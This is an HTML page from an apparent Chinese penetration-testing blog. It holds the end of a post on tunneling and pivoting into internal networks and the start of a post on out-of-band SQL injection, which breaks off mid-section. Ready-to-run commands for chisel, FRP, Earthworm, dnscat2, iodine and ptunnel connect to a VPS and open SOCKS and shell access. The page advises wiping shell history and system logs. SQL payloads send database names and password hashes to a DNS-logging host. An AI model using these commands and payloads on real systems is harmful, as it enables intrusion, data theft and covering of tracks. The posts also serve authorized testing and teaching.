+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS 服务端</span></span><br><span class="line">./chisel server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网客户端 → VPS 1080 即为 SOCKS5 入口</span></span><br><span class="line">./chisel client vps.example.com:8000 R:0.0.0.0:1080:socks</span><br></pre></td></tr></table></figure>
+
+<p><strong>反向端口映射（RDP 出网）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client vps.example.com:8000 R:3389:192.168.1.100:3389</span><br></pre></td></tr></table></figure>
+
+<p><strong>多层穿透：</strong> 边界主机 <code>R:1080:socks</code> → 深层主机 <code>./chisel client 192.168.1.50:1080 socks</code></p>
+<hr>
+<h2 id="3-FRP-—-高性能内网穿透"><a href="#3-FRP-—-高性能内网穿透" class="headerlink" title="3. FRP — 高性能内网穿透"></a>3. FRP — 高性能内网穿透</h2><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">FRP</a> 支持 TCP&#x2F;UDP&#x2F;HTTP&#x2F;HTTPS&#x2F;STCP，配置灵活，适合长稳代理。</p>
+<p><strong>服务端 frps.ini：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">token</span> = YourStrongToken123</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端 frpc.ini — TCP + SOCKS5：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = vps.example.com</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = YourStrongToken123</span><br><span class="line"></span><br><span class="line"><span class="section">[tcp-rdp]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3389</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">13389</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5-proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">11080</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure>
+
+<p>启动：<code>./frps -c frps.ini</code> &#x2F; <code>./frpc -c frpc.ini</code></p>
+<hr>
+<h2 id="4-Earthworm-EW-—-经典-SOCKS5-级联"><a href="#4-Earthworm-EW-—-经典-SOCKS5-级联" class="headerlink" title="4. Earthworm (EW) — 经典 SOCKS5 级联"></a>4. Earthworm (EW) — 经典 SOCKS5 级联</h2><p><strong>正向（目标外网可达）：</strong> <code>./ew -s ssocksd -l 1080</code>（攻击机直接 socks5:&#x2F;&#x2F;target_ip:1080）</p>
+<p><strong>反向（目标内网，穿透防火墙）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS</span></span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网主机</span></span><br><span class="line">./ew -s rssocks -d vps.example.com -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><strong>二级级联（深度内网无法出网）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS</span></span><br><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line"><span class="comment"># 边界主机 A（可出网，连接 VPS 与深层 B）</span></span><br><span class="line">./ew -s lcx_slave -d vps.example.com -e 8888 -f 192.168.100.50 -g 9999</span><br><span class="line"><span class="comment"># 深层主机 B（不可出网）</span></span><br><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+<p>拓扑：<code>攻击机 → VPS:1080 → 边界A:8888 → 深层B:9999 → 核心区域</code></p>
+<hr>
+<h2 id="5-ProxyChains-与-SocksCap"><a href="#5-ProxyChains-与-SocksCap" class="headerlink" title="5. ProxyChains 与 SocksCap"></a>5. ProxyChains 与 SocksCap</h2><h3 id="5-1-ProxyChains（Linux）"><a href="#5-1-ProxyChains（Linux）" class="headerlink" title="5.1 ProxyChains（Linux）"></a>5.1 ProxyChains（Linux）</h3><p>通过 LD_PRELOAD 劫持 syscall，将任意程序 TCP 流量经过代理链。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/proxychains4.conf</span></span><br><span class="line">strict_chain</span><br><span class="line">proxy_dns</span><br><span class="line"><span class="section">[ProxyList]</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.1.0/24</span><br><span class="line">proxychains4 msfconsole</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>注意：</strong> 无法代理 ICMP&#x2F;SYN，Nmap 必须用 <code>-sT</code>（全连接扫描）。</p>
+</blockquote>
+<h3 id="5-2-SocksCap64（Windows）"><a href="#5-2-SocksCap64（Windows）" class="headerlink" title="5.2 SocksCap64（Windows）"></a>5.2 SocksCap64（Windows）</h3><p>通过 Hook WinSock 将程序流量重定向至 SOCKS。将目标程序（mstsc.exe、浏览器）拖入启动即可。勾选 “Resolve DNS remotely” 防止 DNS 泄漏。替代方案：Proxifier、Netch。</p>
+<hr>
+<h2 id="6-ICMP-隧道-—-ptunnel"><a href="#6-ICMP-隧道-—-ptunnel" class="headerlink" title="6. ICMP 隧道 — ptunnel"></a>6. ICMP 隧道 — ptunnel</h2><p>当防火墙仅放行 ICMP 时，将 TCP 数据封装在 ICMP Echo 载荷中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端（VPS）</span></span><br><span class="line">ptunnel -x StrongPass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（内网）— 将 VPS 2222 映射到内网 192.168.1.100:22</span></span><br><span class="line">ptunnel -p vps.example.com -lp 2222 -da 192.168.1.100 -dp 22 -x StrongPass</span><br><span class="line"><span class="comment"># ssh root@127.0.0.1 -p 2222 即可连接</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>速度慢（每个包需等待 reply），适合 Shell 交互，不适合大文件传输。</p>
+</blockquote>
+<hr>
+<h2 id="7-DNS-隧道"><a href="#7-DNS-隧道" class="headerlink" title="7. DNS 隧道"></a>7. DNS 隧道</h2><p>DNS 隧道是仅 UDP 53 放行时的最后手段——将数据封装在 DNS 请求&#x2F;响应中。</p>
+<h3 id="7-1-dnscat2（高隐蔽性、C2-专用）"><a href="#7-1-dnscat2（高隐蔽性、C2-专用）" class="headerlink" title="7.1 dnscat2（高隐蔽性、C2 专用）"></a>7.1 dnscat2（高隐蔽性、C2 专用）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">dnscat2-server your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（Linux）</span></span><br><span class="line">./dnscat2 --dns server=vps.example.com,domain=your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（Windows PowerShell）</span></span><br><span class="line">Start-Dnscat2 -Domain your-domain.com -DNSServer vps.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接后</span></span><br><span class="line">session -i 1                    <span class="comment"># 交互 Shell</span></span><br><span class="line">listen 127.0.0.1:4444 192.168.1.100:3389  <span class="comment"># 端口转发</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-iodine（高速-DNS-隧道）"><a href="#7-2-iodine（高速-DNS-隧道）" class="headerlink" title="7.2 iodine（高速 DNS 隧道）"></a>7.2 iodine（高速 DNS 隧道）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端（VPS，需 NS 记录指向本机）</span></span><br><span class="line">iodined -f -P SecretPass 10.0.0.1/24 tunnel.your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（内网，连接后获得 10.0.0.2）</span></span><br><span class="line">iodine -f -P SecretPass vps.example.com tunnel.your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接访问隧道对端：ssh root@10.0.0.2</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>速度</th>
+<th>隐蔽性</th>
+<th>适用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dnscat2</td>
+<td>~1-5 KB&#x2F;s</td>
+<td>高（加密）</td>
+<td>低速 C2、Shell</td>
+</tr>
+<tr>
+<td>iodine</td>
+<td>~100-680 KB&#x2F;s</td>
+<td>中（可检测）</td>
+<td>文件传输、代理</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="8-iptables-端口转发"><a href="#8-iptables-端口转发" class="headerlink" title="8. iptables 端口转发"></a>8. iptables 端口转发</h2><p>利用已控 Linux 主机做路由跳板，无需额外工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启转发</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将本机 2222 → 内网 192.168.1.100:22</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.1.100:22</span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 192.168.1.100 --dport 22 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<p><strong>跨网段转发（双网卡主机）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0:10.0.0.5(外), eth1:192.168.10.5(内) → 深层 192.168.20.0/24</span></span><br><span class="line">ip route add 192.168.20.0/24 via 192.168.10.1 dev eth1</span><br><span class="line">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 3389 -j DNAT --to-destination 192.168.20.100:3389</span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.20.100 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -p tcp -d 192.168.20.100 --dport 3389 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<p><strong>无 root 替代 — socat：</strong> <code>socat TCP-LISTEN:2222,fork,reuseaddr TCP:192.168.1.100:22</code></p>
+<p><strong>Windows netsh：</strong> <code>netsh interface portproxy add v4tov4 listenport=3389 connectaddress=192.168.1.100 connectport=3389</code></p>
+<hr>
+<h2 id="9-隧道技术全景对比"><a href="#9-隧道技术全景对比" class="headerlink" title="9. 隧道技术全景对比"></a>9. 隧道技术全景对比</h2><table>
+<thead>
+<tr>
+<th>隧道类型</th>
+<th>工具</th>
+<th>协议层</th>
+<th>出网条件</th>
+<th>速度</th>
+<th>隐蔽性</th>
+<th>复杂环境适应性</th>
+<th>推荐场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSH 转发</td>
+<td>OpenSSH</td>
+<td>L4</td>
+<td>TCP 22</td>
+<td>高</td>
+<td>低</td>
+<td>中</td>
+<td>首选方案，有 SSH 即可</td>
+</tr>
+<tr>
+<td>HTTP(S)</td>
+<td>FRP</td>
+<td>L7</td>
+<td>TCP 80&#x2F;443</td>
+<td>高</td>
+<td>中</td>
+<td>高</td>
+<td>长稳代理、多协议穿透</td>
+</tr>
+<tr>
+<td>TCP 隧道</td>
+<td>Chisel</td>
+<td>L4</td>
+<td>任意 TCP</td>
+<td>高</td>
+<td>中</td>
+<td>高</td>
+<td>快速隧道，无 SSH 时</td>
+</tr>
+<tr>
+<td>SOCKS5 级联</td>
+<td>EW</td>
+<td>L4</td>
+<td>任意 TCP</td>
+<td>中</td>
+<td>中</td>
+<td>高</td>
+<td>多级内网级联</td>
+</tr>
+<tr>
+<td>ICMP 隧道</td>
+<td>ptunnel</td>
+<td>L3</td>
+<td>ICMP</td>
+<td>低</td>
+<td>中</td>
+<td>低</td>
+<td>仅 ICMP 放行</td>
+</tr>
+<tr>
+<td>DNS 隧道</td>
+<td>dnscat2&#x2F;iodine</td>
+<td>L7</td>
+<td>UDP 53</td>
+<td>极低~低</td>
+<td>高</td>
+<td>中</td>
+<td>仅 DNS 放行 &#x2F; 高隐蔽</td>
+</tr>
+<tr>
+<td>路由转发</td>
+<td>iptables</td>
+<td>L3</td>
+<td>无需出网</td>
+<td>高</td>
+<td>高</td>
+<td>低(需root)</td>
+<td>内网横向跳板</td>
+</tr>
+</tbody></table>
+<h3 id="隧道选型决策流程"><a href="#隧道选型决策流程" class="headerlink" title="隧道选型决策流程"></a>隧道选型决策流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">               ┌──────────────────┐</span><br><span class="line">               │ 目标是否可以出网？  │</span><br><span class="line">               └────────┬─────────┘</span><br><span class="line">                        │</span><br><span class="line">           ┌────────────┴────────────┐</span><br><span class="line">           ▼                         ▼</span><br><span class="line">      【可出网】                  【不可出网】</span><br><span class="line">  出网协议是什么？          利用已控边界主机转发</span><br><span class="line">  │    │    │    │        (iptables / EW 级联)</span><br><span class="line">TCP22 TCP80 ICMP DNS</span><br><span class="line">  │    │    │    │</span><br><span class="line">  ▼    ▼    ▼    ▼</span><br><span class="line">SSH  FRP  ptunnel dnscat2</span><br><span class="line">        Chisel       iodine</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="10-实战组合：多层内网穿透"><a href="#10-实战组合：多层内网穿透" class="headerlink" title="10. 实战组合：多层内网穿透"></a>10. 实战组合：多层内网穿透</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">场景：最内层仅 DNS 出网，经过两道隔离</span><br><span class="line">Internet → VPS(FRP) → 边界Web(FRPC+EW) → 内层DB(DNS隧道)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 1 — VPS：</strong> <code>./frps -c frps.ini</code></p>
+<p><strong>Step 2 — 边界主机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini        <span class="comment"># 连接 VPS，暴露 SOCKS5</span></span><br><span class="line">./ew -s ssocksd -l 2080   <span class="comment"># 对内开放 SOCKS5 供深层使用</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3 — 深层主机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat2 --dns server=192.168.1.50,domain=inner.tunnel.local</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="11-稳定性优化"><a href="#11-稳定性优化" class="headerlink" title="11. 稳定性优化"></a>11. 稳定性优化</h2><ul>
+<li><strong>心跳保活：</strong> SSH <code>ServerAliveInterval=60</code>；FRP <code>heartbeat_timeout=30</code></li>
+<li><strong>自动重连：</strong> autossh（SSH）、systemd service &#x2F; supervisor（FRP&#x2F;Chisel）</li>
+<li><strong>流量压缩加密：</strong> SSH <code>-C</code>、FRP <code>use_encryption=true</code>、Chisel 自带加密</li>
+<li><strong>进程守护：</strong> <code>nohup cmd &amp;</code>（临时）、systemd（长稳）</li>
+<li><strong>日志清理：</strong> 操作完成后清理 <code>~/.bash_history</code> 及 <code>/var/log/</code> 相关记录（授权范围内操作请遵循规范）</li>
+</ul>
+<hr>
+<h2 id="12-免责声明"><a href="#12-免责声明" class="headerlink" title="12. 免责声明"></a>12. 免责声明</h2><blockquote>
+<p><strong>本文所述技术仅供授权的安全测试、教学研究及网络运维学习使用。</strong></p>
+<ul>
+<li>未经目标系统所有者明确授权，严禁利用隧道或代理技术对他人网络进行访问、测试或攻击。</li>
+<li>使用者须遵守《中华人民共和国网络安全法》《刑法》第285&#x2F;286条及相关法律法规，违法行为将承担法律责任。</li>
+<li>本文作者不对任何滥用本文技术造成的后果负责。</li>
+<li>授权渗透测试中应遵循最小影响原则，测试完毕后及时清理隧道与日志。</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://man.openbsd.org/ssh">OpenSSH Manual</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">FRP GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://rootkiter.com/EarthWorm/">Earthworm</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">dnscat2 GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">iodine GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.cs.uit.no/~daniels/PingTunnel/">ptunnel</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1572/">MITRE ATT&amp;CK T1572 — Protocol Tunneling</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-out-of-band/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-out-of-band/" class="post-title-link" itemprop="url">SQL注入：OOB外带注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-01T08:00:00+08:00">2025-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>传统SQL注入依赖页面回显（Union）或盲注逐字符猜解。当目标屏蔽回显且网络允许时，<strong>Out-of-Band（OOB）外带注入</strong>将数据通过DNS&#x2F;HTTP&#x2F;SMB带外信道传出，绕开前端，把盲注升级为”半显式”攻击。本文梳理各数据库OOB技法、DNSLOG原理、SQLMap实战与防御。</p>
+<hr>
+<h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>传统注入数据走HTTP响应；OOB由数据库主动发起外连（DNS查询、UNC路径、HTTP请求），将数据编码在协议载荷中：</p>
+<pre class="mermaid">flowchart LR
+    subgraph 传统注入
+        A1[Payload] --> A2[DB] --> A3[HTTP响应] --> A4[攻击者]
+    end
+    subgraph OOB注入
+        B1[Payload] --> B2[DB]
+        B2 -- DNS/HTTP/SMB --> B3[DNSLOG平台] --> B4[攻击者]
+    end</pre>
+
+<hr>
+<h2 id="DNSLOG原理"><a href="#DNSLOG原理" class="headerlink" title="DNSLOG原理"></a>DNSLOG原理</h2><p>DNS是首选OOB信道：UDP 53极少被拦截、查询可携带任意子域名、递归解析保证到达攻击者NS。流程：注册DNSLOG平台 → Payload拼接 <code>&lt;data&gt;.attacker.com</code> → 数据库触发 <code>gethostbyname</code> → DNSLOG记录 → 攻击者轮询API解码。</p>
+<pre class="mermaid">flowchart TD
+    A[SQL Payload] --> B[DB拼接域名] --> C[OS DNS解析]
+    C --> D[DNSLOG权威NS] --> E[攻击者轮询API]</pre>
+
+<table>
+<thead>
+<tr>
+<th>平台</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ceye.io</td>
+<td>注册即送二级域名，支持DNS&#x2F;HTTP&#x2F;TCP</td>
+</tr>
+<tr>
+<td>Burp Collaborator</td>
+<td>Burp内置，全协议，HTTPS上下文复用</td>
+</tr>
+<tr>
+<td>Interactsh</td>
+<td>开源，自托管，API友好</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="各数据库OOB技法"><a href="#各数据库OOB技法" class="headerlink" title="各数据库OOB技法"></a>各数据库OOB技法</h2><h3 id="一、MySQL"><a href="#一、MySQL" class="headerlink" title="一、MySQL"></a>一、MySQL</h3><p>LOAD_FILE + UNC路径（Windows）利用UNC解析自动触发DNS与SMB：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 验证注入点</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>, DATABASE(), <span class="string">&#x27;.your-id.ceye.io\\abc&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 拖表名（GROUP_CONCAT拼接多行）</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> GROUP_CONCAT(table_name SEPARATOR <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">   <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE()),</span><br><span class="line">  <span class="string">&#x27;.your-id.ceye.io\\abc&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 拖字段（hex编码避免特殊字符破坏域名）</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">  HEX((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>)), <span class="string">&#x27;.your-id.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>前提</strong>：MySQL on Windows；<code>secure_file_priv</code> 为空或宽松；<code>FILE</code> 权限。受限时尝试UDF外带。</p>
+<hr>
+<h3 id="二、MSSQL"><a href="#二、MSSQL" class="headerlink" title="二、MSSQL"></a>二、MSSQL</h3><p>MSSQL得益于大量扩展存储过程，OOB手段最丰富。</p>
+<p><strong>xp_dirtree</strong> —— 接受UNC路径自动触发SMB&#x2F;DNS：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@h</span> <span class="type">VARCHAR</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@h</span> <span class="operator">=</span> <span class="built_in">SUBSTRING</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">40</span>) <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master..xp_dirtree <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@h</span> <span class="operator">+</span> <span class="string">&#x27;\foo&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 游标逐行枚举</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@d</span> <span class="type">VARCHAR</span>(<span class="number">100</span>), <span class="variable">@c</span> <span class="type">VARCHAR</span>(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">DECLARE</span> cur <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.databases;</span><br><span class="line"><span class="keyword">OPEN</span> cur; <span class="keyword">FETCH</span> NEXT <span class="keyword">FROM</span> cur <span class="keyword">INTO</span> <span class="variable">@d</span>;</span><br><span class="line">WHILE @<span class="variable">@FETCH_STATUS</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SET</span> <span class="variable">@c</span> <span class="operator">=</span> <span class="string">&#x27;master..xp_dirtree &#x27;&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@d</span> <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">EXEC</span>(<span class="variable">@c</span>); <span class="keyword">FETCH</span> NEXT <span class="keyword">FROM</span> cur <span class="keyword">INTO</span> <span class="variable">@d</span>;</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">CLOSE</span> cur; <span class="keyword">DEALLOCATE</span> cur;</span><br></pre></td></tr></table></figure>
+
+<p><strong>xp_fileexist &#x2F; xp_subdirs</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_fileexist <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span> DB_NAME() <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master..xp_subdirs <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="built_in">SYSTEM_USER</span> <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>OLE自动化对象（HTTP外带）与 sp_makewebtask</strong>：</p>
